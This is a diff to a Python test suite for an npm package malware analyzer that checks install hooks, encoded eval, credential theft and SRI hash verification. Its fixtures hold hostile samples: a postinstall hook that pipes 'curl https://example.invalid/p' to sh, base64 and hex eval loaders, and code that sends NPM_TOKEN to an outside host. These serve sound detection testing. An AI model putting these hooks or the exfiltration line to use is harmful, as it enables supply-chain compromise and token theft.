@@ -1,7 +1,9 @@
 from __future__ import annotations
 
+import base64
 import hashlib
 import io
+import json
 import tarfile
 import zipfile
 
@@ -112,12 +114,179 @@ def test_package_code_analyzer_ignores_benign_package(tmp_path):
     assert findings == []
 
 
+def test_npm_analyzer_blocks_install_hook_exec(tmp_path):
+    tgz = tmp_path / "bad-1.0.0.tgz"
+    _write_npm_tgz(
+        tgz,
+        {
+            "package/package.json": json.dumps(
+                {
+                    "name": "bad",
+                    "version": "1.0.0",
+                    "scripts": {"postinstall": "curl https://example.invalid/p | sh"},
+                }
+            )
+        },
+    )
+
+    # Use a real npm sha512 SRI integrity so this also exercises hash verification.
+    findings = _analyze_archive(tmp_path, tgz, kind="npm-tarball", integrity=_npm_integrity(tgz))
+
+    finding = next(f for f in findings if f.signal_type == "npm-install-script-exec")
+    assert finding.metadata["action"] == "block"
+    assert finding.evidence[0].metadata["file_path"] == "package/package.json"
+
+
+def test_npm_analyzer_investigates_plain_install_hook(tmp_path):
+    tgz = tmp_path / "bad-1.0.0.tgz"
+    _write_npm_tgz(
+        tgz,
+        {
+            "package/package.json": json.dumps(
+                {
+                    "name": "bad",
+                    "version": "1.0.0",
+                    "scripts": {"postinstall": "node ./scripts/build.js"},
+                }
+            )
+        },
+    )
+
+    findings = _analyze_archive(tmp_path, tgz, kind="npm-tarball")
+
+    assert any(f.signal_type == "npm-install-script" for f in findings)
+    finding = next(f for f in findings if f.signal_type == "npm-install-script")
+    assert finding.metadata["action"] == "investigate"
+    assert not any(f.signal_type == "npm-install-script-exec" for f in findings)
+
+
+def test_npm_analyzer_blocks_encoded_execution(tmp_path):
+    tgz = tmp_path / "bad-1.0.0.tgz"
+    _write_npm_tgz(
+        tgz,
+        {
+            "package/package.json": json.dumps({"name": "bad", "version": "1.0.0"}),
+            "package/index.js": (
+                "const p = Buffer.from('cHJpbnQoMSk=', 'base64').toString();\neval(p);\n"
+            ),
+        },
+    )
+
+    findings = _analyze_archive(tmp_path, tgz, kind="npm-tarball")
+
+    finding = next(f for f in findings if f.signal_type == "npm-encoded-execution")
+    assert finding.metadata["action"] == "block"
+
+
+def test_npm_analyzer_blocks_hex_encoded_execution(tmp_path):
+    tgz = tmp_path / "bad-1.0.0.tgz"
+    _write_npm_tgz(
+        tgz,
+        {
+            "package/package.json": json.dumps({"name": "bad", "version": "1.0.0"}),
+            "package/index.js": (
+                "const p = Buffer.from('70726f636573732e657869742829', 'hex').toString();\n"
+                "eval(p);\n"
+            ),
+        },
+    )
+
+    findings = _analyze_archive(tmp_path, tgz, kind="npm-tarball")
+
+    finding = next(f for f in findings if f.signal_type == "npm-encoded-execution")
+    assert finding.metadata["action"] == "block"
+
+
+def test_npm_analyzer_blocks_credential_exfiltration(tmp_path):
+    tgz = tmp_path / "bad-1.0.0.tgz"
+    _write_npm_tgz(
+        tgz,
+        {
+            "package/package.json": json.dumps({"name": "bad", "version": "1.0.0"}),
+            "package/index.js": (
+                "const t = process.env.NPM_TOKEN;\n"
+                "require('https').request('https://example.invalid', () => {}).end(t);\n"
+            ),
+        },
+    )
+
+    findings = _analyze_archive(tmp_path, tgz, kind="npm-tarball")
+
+    assert any(f.signal_type == "npm-credential-exfiltration" for f in findings)
+
+
+def test_npm_analyzer_ignores_benign_package(tmp_path):
+    tgz = tmp_path / "benign-1.0.0.tgz"
+    _write_npm_tgz(
+        tgz,
+        {
+            "package/package.json": json.dumps(
+                {"name": "benign", "version": "1.0.0", "scripts": {"test": "jest"}}
+            ),
+            "package/index.js": "module.exports = 42;\n",
+        },
+    )
+
+    findings = _analyze_archive(tmp_path, tgz, package_name="benign", kind="npm-tarball")
+
+    assert findings == []
+
+
+def test_npm_analyzer_ignores_package_json_in_python_sdist(tmp_path):
+    sdist = tmp_path / "py-with-assets-1.0.0.tar.gz"
+    with tarfile.open(sdist, "w:gz") as tf:
+        payload = json.dumps(
+            {"scripts": {"postinstall": "curl https://example.invalid/p | sh"}}
+        ).encode()
+        info = tarfile.TarInfo("py-with-assets-1.0.0/vendor/package.json")
+        info.size = len(payload)
+        tf.addfile(info, io.BytesIO(payload))
+
+    findings = _analyze_archive(
+        tmp_path,
+        sdist,
+        package_name="py-with-assets",
+        kind="sdist",
+    )
+
+    assert not any(f.signal_type.startswith("npm-") for f in findings)
+
+
+def _write_npm_tgz(path, files: dict[str, str]):
+    with tarfile.open(path, "w:gz") as tf:
+        for rel, content in files.items():
+            payload = content.encode()
+            info = tarfile.TarInfo(rel)
+            info.size = len(payload)
+            tf.addfile(info, io.BytesIO(payload))
+
+
+def test_verify_hash_supports_npm_sri(tmp_path):
+    from ca9.artifacts.fetch import _verify_hash
+
+    blob = tmp_path / "blob"
+    blob.write_bytes(b"hello world")
+    good = "sha512-" + base64.b64encode(hashlib.sha512(b"hello world").digest()).decode("ascii")
+    bad = "sha512-" + base64.b64encode(hashlib.sha512(b"tampered").digest()).decode("ascii")
+    assert _verify_hash(blob, good)[0] is True
+    assert _verify_hash(blob, bad)[0] is False
+
+
+def _npm_integrity(path) -> str:
+    digest = hashlib.sha512()
+    with path.open("rb") as f:
+        for chunk in iter(lambda: f.read(1024 * 1024), b""):
+            digest.update(chunk)
+    return "sha512-" + base64.b64encode(digest.digest()).decode("ascii")
+
+
 def _analyze_archive(
     tmp_path,
     archive_path,
     *,
     package_name: str = "bad",
     kind: str = "wheel",
+    integrity: str | None = None,
 ):
     evidence = SourceEvidence(source="test", path=str(archive_path), reader="test")
     package = Package(
@@ -128,7 +297,7 @@ def _analyze_archive(
             Artifact(
                 kind=kind,
                 url=archive_path.as_uri(),
-                hash=f"sha256:{_sha256(archive_path)}",
+                hash=integrity or f"sha256:{_sha256(archive_path)}",
                 evidence=(evidence,),
             ),
         ),
